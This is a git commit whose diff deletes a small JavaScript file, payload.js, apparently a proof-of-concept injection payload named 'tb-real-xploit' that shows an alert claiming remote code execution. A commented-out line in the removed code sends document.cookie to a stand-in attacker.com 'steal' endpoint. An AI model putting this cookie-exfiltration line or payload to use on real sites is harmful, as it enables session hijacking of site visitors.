9c74f8b5c7828416ecb54661eb873b779ffa7ae3
Baali07 <amerziko70@gmail.com>
2025-07-21 03:09:43 +0100

    Delete payload.js

--- payload.js
+++
@@ -1,6 +0,0 @@
-window["tb-real-xploit@1.0.0"] = {
-  create: function() {
-    alert("🔥 Remote Code Execution by G9!");
-    // أو: fetch('https://attacker.com/steal?cookie=' + document.cookie)
-  }
-};
